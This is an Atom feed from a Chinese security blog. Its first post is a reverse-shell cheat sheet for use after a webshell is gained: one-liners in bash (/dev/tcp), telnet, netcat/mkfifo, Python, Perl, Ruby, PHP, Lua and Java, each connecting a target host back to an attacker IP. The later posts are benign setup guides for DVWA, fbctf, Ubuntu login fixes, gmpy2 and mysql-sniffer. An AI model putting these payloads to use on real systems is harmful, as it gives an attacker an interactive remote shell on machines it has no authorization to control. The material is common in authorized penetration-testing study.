<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Brucetg&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-05-03T13:57:52.876Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Brucetg</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>多种姿势反弹shell</title>
    <link href="http://yoursite.com/2018/05/03/%E5%A4%9A%E7%A7%8D%E5%A7%BF%E5%8A%BF%E5%8F%8D%E5%BC%B9shell/"/>
    <id>http://yoursite.com/2018/05/03/多种姿势反弹shell/</id>
    <published>2018-05-03T07:55:07.000Z</published>
    <updated>2018-05-03T13:57:52.876Z</updated>
    
    <content type="html"><![CDATA[<p> <strong>在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。</strong></p><a id="more"></a><h2 id="0x01-Bash反弹"><a href="#0x01-Bash反弹" class="headerlink" title="0x01. Bash反弹"></a>0x01. Bash反弹</h2><p>  攻击者主机上执行监听：</p><pre><code>nc -lvvp port</code></pre><p>  目标主机上执行：</p><pre><code>bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1</code></pre><p>  简单解释下：</p><ul><li><strong>bash -i</strong>  &nbsp;&nbsp;打开一个交互的bash</li><li><strong>&gt;&amp;</strong> &nbsp;&nbsp;将标准错误输出重定向到标准输出</li><li><strong>/dev/tcp/x.x.x.x/port</strong> &nbsp;&nbsp;意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口</li><li><strong>0&gt;&amp;1</strong>  &nbsp;&nbsp;标准输入重定向到标准输出，实现你与反弹出来的shell的交互</li></ul><p>  <strong>注：</strong></p><p>  <strong>/dev/tcp/</strong>  是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</p><p>  linux shell下常用的文件描述符是：</p><ol><li><p>标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p></li><li><p>标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p></li><li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p><p>另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。</p><p><strong>其他版本：</strong></p><ol><li><p>exec /bin/bash 0&amp;0 2&gt;&amp;0</p></li><li><p>0&lt;&196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</p></li><li><p>exec 5&lt;&gt;/dev/tcp/attackerip/4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done  # or:while read line 0&lt;&5; do $line 2&gt;&amp;5 &gt;&5; done</p></li></ol></li></ol><h2 id="0x02-telnet反弹"><a href="#0x02-telnet反弹" class="headerlink" title="0x02. telnet反弹"></a>0x02. telnet反弹</h2><p>  攻击者主机上打开两个终端分别执行监听：</p><pre><code>nc -lvvp 4444nc -lvvp 5555</code></pre><p>  目标主机中执行：</p><pre><code>telnet x.x.x.x 4444 | /bin/bash | telnet x.x.x.x 5555</code></pre><p>  监听两个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip</p><p>  反弹shell成功后，在监听4444端口的终端中执行命令可以在另一个终端中看到命令执行结果。</p><p>  另一个版本：</p><pre><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet x.x.x.x 4444 0/tmp/p</code></pre><h2 id="0x03-nc（netcat）反弹"><a href="#0x03-nc（netcat）反弹" class="headerlink" title="0x03. nc（netcat）反弹"></a>0x03. nc（netcat）反弹</h2><p>  攻击者主机上执行监听命令：</p><pre><code>nc -lvvp port</code></pre><p>  目标主机上执行：</p><pre><code>nc -e /bin/bash x.x.x.x port</code></pre><p>  如果目标主机linux发行版本没有 -e 参数，还有以下几种方式：</p><pre><code>1. rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc x.x.x.x 9999 &gt;/tmp/f</code></pre><p>  <strong>注：</strong></p><p>  mkfifo 命令的作用是创建FIFO特殊文件，通常也称为命名管道，FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行read/write，实际上是在读写内核通道（根本原因在于FIFO文件结构体所指向的read、write函数和常规文件不一样），这样就实现了进程间通信。</p><pre><code>2. nc x.x.x.x 4444|/bin/bash|nc x.x.x.x 5555   #从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。3. nc -c /bin/sh x.x.x.x 44444. /bin/sh | nc x.x.x.x 4444</code></pre><h2 id="0x04-常见脚本反弹："><a href="#0x04-常见脚本反弹：" class="headerlink" title="0x04. 常见脚本反弹："></a>0x04. 常见脚本反弹：</h2><p>  <strong>1. Python</strong></p><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos;</code></pre><p>  <strong>2. Perl</strong></p><p>  方法一：  </p><pre><code>perl -e &apos;use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;</code></pre><p>  方法二：</p><pre><code>perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</code></pre><p>  <strong>3. Ruby</strong></p><p>  方法一：</p><pre><code>ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos;</code></pre><p>  方法二：</p><pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;x.x.x.x&quot;,5555).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</code></pre><p>  <strong>4. PHP</strong></p><pre><code>php -r &apos;$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</code></pre><p>  <strong>5. Java</strong></p><pre><code>    public class Revs {    /**    * @param args    * @throws Exception     */    public static void main(String[] args) throws Exception {        // TODO Auto-generated method stub        Runtime r = Runtime.getRuntime();        String cmd[]= {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;};        Process p = r.exec(cmd);        p.waitFor();    }}</code></pre><p>  <strong>6. Lua</strong></p><pre><code>lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;x.x.x.x&apos;,&apos;5555&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</code></pre><p>  注：以上脚本是在目标主机上执行，其中 x.x.x.x 均为攻击者ip，并且需要在攻击者主机上进行监听:</p><pre><code>nc -lvvp 5555</code></pre><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05. 总结"></a>0x05. 总结</h2><p>  上面提到的反弹shell的方法只是一些比较常见的，肯定不够全面，在简单的渗透环境中，上面所提到的应该能满足需求，但是如果是在比较复杂的环境中，还是需要进行一些灵活变通以适应复杂环境的渗透测试，欢迎补充。</p><p>  参考链接：</p><ol><li><a href="https://www.bertramc.cn/2017/07/14/38.html" target="_blank" rel="noopener">https://www.bertramc.cn/2017/07/14/38.html</a></li><li><a href="http://www.myh0st.cn/index.php/archives/237/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/237/</a></li><li><a href="https://www.anquanke.com/post/id/85712" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85712</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; &lt;strong&gt;在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="反弹shell" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
  </entry>
  
  <entry>
    <title>kali linux 2.0下搭建DVWA渗透测试演练平台</title>
    <link href="http://yoursite.com/2018/04/30/kali-linux-2-0%E4%B8%8B%E6%90%AD%E5%BB%BADVWA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%BC%94%E7%BB%83%E5%B9%B3%E5%8F%B0/"/>
    <id>http://yoursite.com/2018/04/30/kali-linux-2-0下搭建DVWA渗透测试演练平台/</id>
    <published>2018-04-29T18:15:29.000Z</published>
    <updated>2018-04-30T07:05:57.349Z</updated>
    
    <content type="html"><![CDATA[<p><strong>DVWA (Dam Vulnerable Web Application)DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞，在kali linux下搭建DVWA非常方便，因为所需的apache2、mysql、php等环境在kali linux中默认已经安装好了</strong></p><a id="more"></a><h3 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤:"></a>搭建步骤:</h3><h3 id="1-首先去github上下载DVWA的安装包，网址为：https-github-com-ethicalhack3r-DVWA"><a href="#1-首先去github上下载DVWA的安装包，网址为：https-github-com-ethicalhack3r-DVWA" class="headerlink" title="1. 首先去github上下载DVWA的安装包，网址为：https://github.com/ethicalhack3r/DVWA"></a>1. 首先去github上下载DVWA的安装包，网址为：<a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></h3><h3 id="2-将下载好的压缩包解压并改名为dvwa，然后将其复制到-var-www-html-文件夹中"><a href="#2-将下载好的压缩包解压并改名为dvwa，然后将其复制到-var-www-html-文件夹中" class="headerlink" title="2. 将下载好的压缩包解压并改名为dvwa，然后将其复制到 /var/www/html  文件夹中"></a>2. 将下载好的压缩包解压并改名为dvwa，然后将其复制到 /var/www/html  文件夹中</h3><h3 id="3-打开终端，执行以下命令"><a href="#3-打开终端，执行以下命令" class="headerlink" title="3. 打开终端，执行以下命令:"></a>3. 打开终端，执行以下命令:</h3><p>   将apache2停止：</p><pre><code>service apache2 stop</code></pre><p>   给dvwa文件夹相应的权限：</p><pre><code>chmod -R 755 /var/www/html/dvwa</code></pre><p>   启动mysql服务： </p><pre><code>service mysql start</code></pre><p>   打开mysql： </p><pre><code>mysql -u root -p</code></pre><p>   创建数据库：</p><pre><code>create database dvwa;</code></pre><p>   退出mysql：</p><pre><code>exit</code></pre><p>   启动apache2服务：</p><pre><code>service apache2 start</code></pre><p>   打开浏览器，在地址栏中输入 127.0.0.1/dvwa  (或者 localhost/dvwa) ,浏览器会自动跳转到127.0.0.1/dvwa/setup.php 页面，看来要大功告成了，点击页面下方</p><p>   Create/Reset Database按钮，竟然不能创建数据库，提示 Could not connect to the MySQL service. Please check the config file. 原来是相应配置文件还没有修改。</p><p>   找到/var/www/html/dvwa/config文件夹，打开其中的config.inc.php文件，将</p><pre><code>$_DVWA[ &apos;db_password&apos; ] = &apos;p@ssw0rd&apos;;  </code></pre><p>   这一行改为</p><pre><code>$_DVWA[ &apos;db_password&apos; ] = &apos;&apos;;</code></pre><p>   再次进入上述网址点击Create/Reset Database按钮，提示数据库创建成功。接下来就可以进入DVWA演练平台进行练习了。默认用户名为admin，密码为password。</p><p><img src="http://img.blog.csdn.net/20161009205455128?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p><p><br></p><p><img src="http://img.blog.csdn.net/20161009205424542?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;DVWA (Dam Vulnerable Web Application)DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞，在kali linux下搭建DVWA非常方便，因为所需的apache2、mysql、php等环境在kali linux中默认已经安装好了&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Kali Linux、DVWA" scheme="http://yoursite.com/tags/Kali-Linux%E3%80%81DVWA/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu14.04虚拟机中搭建fbctf线上比赛平台</title>
    <link href="http://yoursite.com/2018/04/30/ubuntu14-04%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E6%90%AD%E5%BB%BAfbctf%E7%BA%BF%E4%B8%8A%E6%AF%94%E8%B5%9B%E5%B9%B3%E5%8F%B0/"/>
    <id>http://yoursite.com/2018/04/30/ubuntu14-04虚拟机中搭建fbctf线上比赛平台/</id>
    <published>2018-04-29T18:09:49.000Z</published>
    <updated>2018-04-30T07:07:38.342Z</updated>
    
    <content type="html"><![CDATA[<p><strong>FBCTF是一个由 facebook用PHP语言开发的在线安全比赛平台, 学生和开发者可通过此平台了解网络安全和进行安全编码的实践。FBCTF平台开源内容包括CTF游戏地图，可用平台组织自己的线上网络安全比赛。开放注册团队以及得分榜。 现有平台中的挑战包括逆向工程、取证技术、web应用程序安全、密码学和二进制攻击。</strong></p><p>  项目地址：<a href="https://github.com/facebook/fbctf" target="_blank" rel="noopener">https://github.com/facebook/fbctf</a></p><a id="more"></a><p>  官网说的是只支持ubuntu14.04的64位系统，不支持16.04系列，还特意试了下，结果在ubuntu16.04的64位系统版本中没安装成功，在14.04的64位版本上成功安装（操作步骤是一样的）。</p><h2 id="ubuntu14-04下安装步骤："><a href="#ubuntu14-04下安装步骤：" class="headerlink" title="ubuntu14.04下安装步骤："></a>ubuntu14.04下安装步骤：</h2><h2 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1.安装git:"></a>1.安装git:</h2><pre><code>sudo apt-get install gitgit clone https://github.com/facebook/fbctfcd fbctf./extra/provision.sh -m prod -c self -s $PWD</code></pre><p>   这个过程中会安装apache2和mysql等，其中mysql默认密码为root</p><h2 id="2-执行上述步骤后一般会提示不能定位到hhvm项目的地址，接着执行下面的步骤安装hhvm："><a href="#2-执行上述步骤后一般会提示不能定位到hhvm项目的地址，接着执行下面的步骤安装hhvm：" class="headerlink" title="2.执行上述步骤后一般会提示不能定位到hhvm项目的地址，接着执行下面的步骤安装hhvm："></a>2.执行上述步骤后一般会提示不能定位到hhvm项目的地址，接着执行下面的步骤安装hhvm：</h2><pre><code>echo &apos;140.211.166.134 dl.hhvm.com&apos; &gt;&gt; /etc/hostswget -O - http://dl.hhvm.com/conf/hhvm.gpg.key | sudo apt-key add -echo deb http://dl.hhvm.com/ubuntu trusty main | sudo tee /etc/apt/sources.list.d/hhvm.listsudo apt-get updatesudo apt-get install hhvm</code></pre><h2 id="3-然后再次执行-extra-provision-sh-m-prod-c-self-s-PWD"><a href="#3-然后再次执行-extra-provision-sh-m-prod-c-self-s-PWD" class="headerlink" title="3. 然后再次执行:       ./extra/provision.sh -m prod -c self -s $PWD"></a>3. 然后再次执行:       ./extra/provision.sh -m prod -c self -s $PWD</h2><p>   会接着下载安装很多东西，时间可能有点长，最后会在mysql中创建fbctf数据库，不出意外的话，基本到这里就算安装成功了。</p><h2 id="4-验证"><a href="#4-验证" class="headerlink" title="4.验证"></a>4.验证</h2><p>   在浏览器中输入127.0.0.1，若出现下面的界面则说明安装成功。</p><p>   PS： </p><pre><code>1.provision.sh脚本执行结束后会生成fbctf管理员登陆的的用户名和密码，用户名和密码会在脚本执行结束的最后部分打印出来，而不会存储到其他任何位置，管理员账户一般为admin，不过密码是随机生成的，因此要把密码备份一下，省得以后麻烦。2.fbctf官网建议ubuntu14.04系统的内存至少为2GB，否则很有可能会安装出错。3.以上操作均在ubuntu14.04虚拟机中完成。</code></pre><p><img src="http://img.blog.csdn.net/20161210140250175?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p><p><br></p><p><img src="http://img.blog.csdn.net/20161210140422001?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;FBCTF是一个由 facebook用PHP语言开发的在线安全比赛平台, 学生和开发者可通过此平台了解网络安全和进行安全编码的实践。FBCTF平台开源内容包括CTF游戏地图，可用平台组织自己的线上网络安全比赛。开放注册团队以及得分榜。 现有平台中的挑战包括逆向工程、取证技术、web应用程序安全、密码学和二进制攻击。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;  项目地址：&lt;a href=&quot;https://github.com/facebook/fbctf&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/facebook/fbctf&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Ubuntu、fbctf" scheme="http://yoursite.com/tags/Ubuntu%E3%80%81fbctf/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu循环登录问题、桌面菜单和侧边栏不显示问题解决办法</title>
    <link href="http://yoursite.com/2018/04/30/Ubuntu%E5%BE%AA%E7%8E%AF%E7%99%BB%E5%BD%95%E9%97%AE%E9%A2%98%E3%80%81%E6%A1%8C%E9%9D%A2%E8%8F%9C%E5%8D%95%E5%92%8C%E4%BE%A7%E8%BE%B9%E6%A0%8F%E4%B8%8D%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <id>http://yoursite.com/2018/04/30/Ubuntu循环登录问题、桌面菜单和侧边栏不显示问题解决办法/</id>
    <published>2018-04-29T18:04:44.000Z</published>
    <updated>2018-04-30T07:08:16.014Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Ubuntu-16-04输入正确的用户名和密码之后，不能进入桌面，仍然跳回到先前的登录界面"><a href="#1-Ubuntu-16-04输入正确的用户名和密码之后，不能进入桌面，仍然跳回到先前的登录界面" class="headerlink" title="1.Ubuntu 16.04输入正确的用户名和密码之后，不能进入桌面，仍然跳回到先前的登录界面:"></a>1.Ubuntu 16.04输入正确的用户名和密码之后，不能进入桌面，仍然跳回到先前的登录界面:</h2><p>  解决方法: 在登陆界面按Ctrl+Alt+F1组合键，出现终端，输入用户名和密码登陆之后，然后执行:</p><pre><code>sudo rm -r ~/.Xauthoritysudo reboot</code></pre><a id="more"></a><p>   重新登录即可进入系统，默认是自动登录，若想改为输入密码之后才能登陆系统，可进入System Settings中的User Accounts选项中，先点击右上角的Unlock按钮，再将Automatic Login选项设为OFF即可。如下图</p><p>  <img src="http://img.blog.csdn.net/20170408092502084?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p><p>  <br></p><p><img src="http://img.blog.csdn.net/20170408092511161?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p><h2 id="Ubuntu桌面菜单和侧边栏不显示"><a href="#Ubuntu桌面菜单和侧边栏不显示" class="headerlink" title="Ubuntu桌面菜单和侧边栏不显示:"></a>Ubuntu桌面菜单和侧边栏不显示:</h2><p>  解决方法:</p><p>   方法1（适合解决显卡驱动问题）：  </p><p>   先更新系统：</p><pre><code>sudo apt-get updatesudo apt-get dist-upgrade                                                                                                   </code></pre><p>  重启系统： </p><pre><code>sudo reboot</code></pre><p>  方法2：尝试安装ccsm，然后在ccsm中将Ubuntu Unity Plugin设置为启用，根据情况重启系统，看是否能解决。</p><p>  PS：Ubuntu物理机在桌面菜单和侧边栏不显示时，连接wifi可能是一个问题，从而导致无法更新系统，这里有一个简单的办法：在命令行下输入unity-control-center,即可打开系统设置，然后在其中的网络选项中设置wifi连接，这样就方便多了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-Ubuntu-16-04输入正确的用户名和密码之后，不能进入桌面，仍然跳回到先前的登录界面&quot;&gt;&lt;a href=&quot;#1-Ubuntu-16-04输入正确的用户名和密码之后，不能进入桌面，仍然跳回到先前的登录界面&quot; class=&quot;headerlink&quot; title=&quot;1.Ubuntu 16.04输入正确的用户名和密码之后，不能进入桌面，仍然跳回到先前的登录界面:&quot;&gt;&lt;/a&gt;1.Ubuntu 16.04输入正确的用户名和密码之后，不能进入桌面，仍然跳回到先前的登录界面:&lt;/h2&gt;&lt;p&gt;  解决方法: 在登陆界面按Ctrl+Alt+F1组合键，出现终端，输入用户名和密码登陆之后，然后执行:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo rm -r ~/.Xauthority

sudo reboot
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="Ubuntu" scheme="http://yoursite.com/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>kali Linux 64位安装python的gmpy2库报错</title>
    <link href="http://yoursite.com/2018/04/30/kali-Linux-64%E4%BD%8D%E5%AE%89%E8%A3%85python%E7%9A%84gmpy2%E5%BA%93%E6%8A%A5%E9%94%99/"/>
    <id>http://yoursite.com/2018/04/30/kali-Linux-64位安装python的gmpy2库报错/</id>
    <published>2018-04-29T17:58:51.000Z</published>
    <updated>2018-04-30T07:06:19.726Z</updated>
    
    <content type="html"><![CDATA[<p>  前段时间 网上找了个解密RSA的Python脚本，兴高采烈地拿到Kali Linux中跑一下，然后提示没安装gmpy2这个库，接下来就遇到了一系列小的问题，大概说一下解决办法。</p><a id="more"></a><h2 id="1-执行pip-install-gmpy2-报错，提示-src-gmpy-h-252-20-fatal-error-mpfr-h-没有那个文件或目录"><a href="#1-执行pip-install-gmpy2-报错，提示-src-gmpy-h-252-20-fatal-error-mpfr-h-没有那个文件或目录" class="headerlink" title="1.执行pip install gmpy2, 报错，提示  src/gmpy.h:252:20: fatal error: mpfr.h: 没有那个文件或目录"></a>1.执行pip install gmpy2, 报错，提示  src/gmpy.h:252:20: fatal error: mpfr.h: 没有那个文件或目录</h2><p><br></p><p><img src="http://img.blog.csdn.net/20170430202949275?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p><h2 id="2-网上搜索一下，找到了解决方案："><a href="#2-网上搜索一下，找到了解决方案：" class="headerlink" title="2. 网上搜索一下，找到了解决方案："></a>2. 网上搜索一下，找到了解决方案：</h2><p>  首先从  <a href="ftp://ftp.gnu.org/gnu/mpfr/" target="_blank" rel="noopener">ftp://ftp.gnu.org/gnu/mpfr/</a>   下载最新的mpfr的压缩包，这里我下载的是mpfr-3.1.5.zip</p><p>  在Kali中执行以下命令：</p><pre><code>unzip mpfr-3.1.5.zip   (这里需要根据下载的压缩包所在的实际目录修改一下)cd mpfr-3.1.5./configuremakemake checkVERBOSE=1 make checkmake install</code></pre><p>  如果以上过程中不报错的话，mpfr就安装好了 ，详细安装过程可参考官方文档：<a href="http://www.mpfr.org/mpfr-current/mpfr.html" target="_blank" rel="noopener">http://www.mpfr.org/mpfr-current/mpfr.html</a> </p><p>  本以为mpfr安装好就解决问题了，运行  </p><pre><code>pip install gmpy2  </code></pre><p>  刚才的问题没有了，又出现了新的问题，缺少mpc.h头文件，如下图，Excuse me？ </p><p><img src="http://img.blog.csdn.net/20170430204541406?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="">   </p><p>然后就有了第3步：</p><h2 id="3-从-ftp-gcc-gnu-org-pub-gcc-infrastructure-下载最新的mpc压缩包，这里我下载的是-mpc-1-0-3-tar-gz-，接着在-Kali-中执行以下命令："><a href="#3-从-ftp-gcc-gnu-org-pub-gcc-infrastructure-下载最新的mpc压缩包，这里我下载的是-mpc-1-0-3-tar-gz-，接着在-Kali-中执行以下命令：" class="headerlink" title="3.  从  ftp://gcc.gnu.org/pub/gcc/infrastructure/  下载最新的mpc压缩包，这里我下载的是  mpc-1.0.3.tar.gz  ，接着在 Kali 中执行以下命令："></a>3.  从  <a href="ftp://gcc.gnu.org/pub/gcc/infrastructure/" target="_blank" rel="noopener">ftp://gcc.gnu.org/pub/gcc/infrastructure/</a>  下载最新的mpc压缩包，这里我下载的是  mpc-1.0.3.tar.gz  ，接着在 Kali 中执行以下命令：</h2><pre><code>tar -xzvf  mpc-1.0.3.tar.gz     (这里需要根据下载的压缩包所在的实际目录修改一下)cd mpc-1.0.3./configuremakemake install</code></pre><p>  若以上过程没报错，问题就已经解决，然后执行  </p><pre><code>pip install gmpy2  </code></pre><p>  提示  gmpy2  安装成功，就可以愉快的跑脚本啦！</p><p>  <img src="http://img.blog.csdn.net/20170430205553891?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  前段时间 网上找了个解密RSA的Python脚本，兴高采烈地拿到Kali Linux中跑一下，然后提示没安装gmpy2这个库，接下来就遇到了一系列小的问题，大概说一下解决办法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Kali linux、gmpy2" scheme="http://yoursite.com/tags/Kali-linux%E3%80%81gmpy2/"/>
    
  </entry>
  
  <entry>
    <title>Kali Linux安装mysql-sniffer</title>
    <link href="http://yoursite.com/2018/04/30/Kali-Linux%E5%AE%89%E8%A3%85mysql-sniffer/"/>
    <id>http://yoursite.com/2018/04/30/Kali-Linux安装mysql-sniffer/</id>
    <published>2018-04-29T17:47:06.000Z</published>
    <updated>2018-04-30T07:06:45.605Z</updated>
    
    <content type="html"><![CDATA[<p>偶然在github上看到了mysql抓包工具mysql-sniffer，出于好奇体验了一下，不过安装过程中遇到了几个坑，在此记录一下。</p><p>   项目地址： <a href="https://github.com/Qihoo360/mysql-sniffer" target="_blank" rel="noopener">https://github.com/Qihoo360/mysql-sniffer</a><br><a id="more"></a></p><p>  参照官方安装方法：</p><p><br></p><pre><code>1. git clone https://github.com/Qihoo360/mysql-sniffer2. cd mysql-sniffer3. mkdir proj4. cd proj5. cmake ../</code></pre><p>  第5步的时候提示没有安装cmake，通过</p><pre><code>apt-get updateapt-get install cmake</code></pre><p>  即可解决；</p><p>  安装好cmake之后再次执行步骤5，提示缺少pcap.h这个头文件，如下</p><p>  <br></p><p>  <img src="http://img.blog.csdn.net/20170609193742547?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p><p><br></p><p>  官方给出的依赖为：</p><p>Dependence:</p><pre><code>glib2-devel、libpcap-devel、libnet-devel</code></pre><p>   安装libpcap-dev即可（注意是libpcap-dev）</p><p>   再次执行步骤5：</p><p>   原来的错误没有了，又出现了新的错误，提示缺少   libnet.h   这个头文件</p><p> <br></p><p>  <img src="http://img.blog.csdn.net/20170609194448853?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p><p>  老套路，安装libnet-dev即可（注意是libnet-dev）</p><p>  执行步骤5，本来以为应该没问题了，谁知到又出现了新问题 :   缺少glib.h头文件</p><p>  <img src="http://img.blog.csdn.net/20170609195102594?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2FuenQxMjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p><p>  想到依赖中的glib2-devel还没安装，应该是缺少了这个软件包吧，就试着安装glib2-dev  :</p><pre><code>aptitude install gib2-dev    </code></pre><p>（aptitude不是kali自带的，可通过apt-get install aptitude来安装，据说对依赖问题解决的比较好）</p><p>   Kali中提示找不到软件包，不过给出了一些提示 : </p><pre><code>Couldn&apos;t find any package whose name is &quot;glib2-dev&quot;, but there are 1 packages which contain &quot;glib2-dev&quot; in their name:            libpackagekit-glib2-dev </code></pre><p>  那就试试安装libpackagekit-glib2-dev， 通过</p><pre><code>aptitude install libpackagekit-glib2-dev</code></pre><p>  即可安装。</p><p>   